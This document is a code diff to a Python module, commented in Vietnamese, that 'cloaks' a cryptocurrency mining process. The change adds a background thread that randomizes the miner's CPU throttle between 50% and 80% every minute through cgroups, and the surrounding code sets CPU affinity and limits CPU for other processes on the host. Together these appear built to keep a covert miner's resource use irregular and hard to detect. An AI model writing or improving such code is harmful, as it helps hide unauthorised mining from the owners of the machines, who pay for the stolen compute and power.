@@ -4,6 +4,7 @@ theo mô hình đồng bộ (synchronous + threading).
 Đảm bảo tương thích với ResourceManager đã refactor (không dùng async/await).
 """
 
+
 import os
 import logging
 import subprocess
@@ -12,7 +13,8 @@ import pynvml
 import traceback
 import threading
 import time
-import re  
+import re
+import random
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
 
@@ -62,6 +64,7 @@ class CloakStrategy(ABC):
 ###############################################################################
 #                 CPU STRATEGY: CpuCloakStrategy                              #
 ###############################################################################
+
 class CpuCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking CPU đồng bộ:
@@ -88,10 +91,11 @@ class CpuCloakStrategy(CloakStrategy):
         self.config = config
         self.cpu_resource_manager = cpu_resource_manager
 
-        self.throttle_percentage = config.get('throttle_percentage', 80)
+        # Giới hạn CPU ban đầu
+        self.throttle_percentage = config.get('throttle_percentage', 60)
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
-            self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
-            self.throttle_percentage = 80
+            self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 50%.")
+            self.throttle_percentage = 60
 
         self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
         if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
@@ -100,6 +104,43 @@ class CpuCloakStrategy(CloakStrategy):
 
         self.exempt_pids = config.get('exempt_pids', [])  # DS PID không bị throttle external
         self.target_cores = config.get('target_cores', None)
+
+        # Tạo luồng nền để cập nhật throttle_percentage
+        self.dynamic_throttle = config.get('dynamic_throttle', True)
+        if self.dynamic_throttle:
+            self.update_interval = config.get('update_interval', 60)  # Cập nhật mỗi 60 giây
+            self.dynamic_thread = threading.Thread(target=self._update_throttle_percentage, daemon=True)
+            self.dynamic_thread.start()
+
+        # Lưu trữ tên cgroup cho mỗi PID
+        self.process_cgroup: Dict[int, str] = {}
+
+    def _update_throttle_percentage(self) -> None:
+        """
+        Luồng chạy nền để cập nhật throttle_percentage động.
+        """
+        while True:
+            try:
+                # Tạo giá trị throttle_percentage ngẫu nhiên từ 50% đến 80%
+                self.throttle_percentage = random.uniform(50, 80)
+                self.logger.info(f"Đã cập nhật throttle_percentage động: {self.throttle_percentage:.2f}%.")
+
+                # Áp dụng lại throttle cho tất cả các tiến trình đang được quản lý
+                for pid, process_name in self.process_cgroup.items():
+                    try:
+                        self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, process_name)
+                        self.logger.info(
+                            f"Đã áp dụng lại throttle_percentage={self.throttle_percentage:.2f}% cho {process_name}(PID={pid})."
+                        )
+                    except Exception as e:
+                        self.logger.error(
+                            f"Lỗi khi áp dụng lại throttle_percentage cho {process_name}(PID={pid}): {e}"
+                        )
+            except Exception as e:
+                self.logger.error(f"Lỗi khi cập nhật throttle_percentage động: {e}")
+
+            # Chờ đến lần cập nhật tiếp theo
+            time.sleep(self.update_interval)
 
     def apply(self, process: MiningProcess) -> None:
         """
@@ -110,25 +151,28 @@ class CpuCloakStrategy(CloakStrategy):
         try:
             pid, name = process.pid, process.name
 
-            # 1) Giới hạn CPU usage
-            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
+            # Lấy tên cgroup hiện tại, nếu chưa có thì tạo mới
+            cgroup_name = self.process_cgroup.get(pid)
+            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, cgroup_name)
+
             if cgroup_name:
-                self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage}% cho {name}(PID={pid}).")
+                self.process_cgroup[pid] = cgroup_name
+                self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage:.2f}% cho {name}(PID={pid}).")
             else:
                 self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
                 return
 
-            # 2) Tối ưu cache CPU
+            # Tối ưu cache CPU
             success_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
             if success_cache:
                 self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {name}(PID={pid}).")
 
-            # 3) Đặt CPU affinity
+            # Đặt CPU affinity
             success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
             if success_affinity:
                 self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {name}(PID={pid}).")
 
-            # 4) Hạn chế tiến trình bên ngoài
+            # Hạn chế tiến trình bên ngoài
             outside_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
                 [pid] + self.exempt_pids,
                 self.throttle_external_percentage
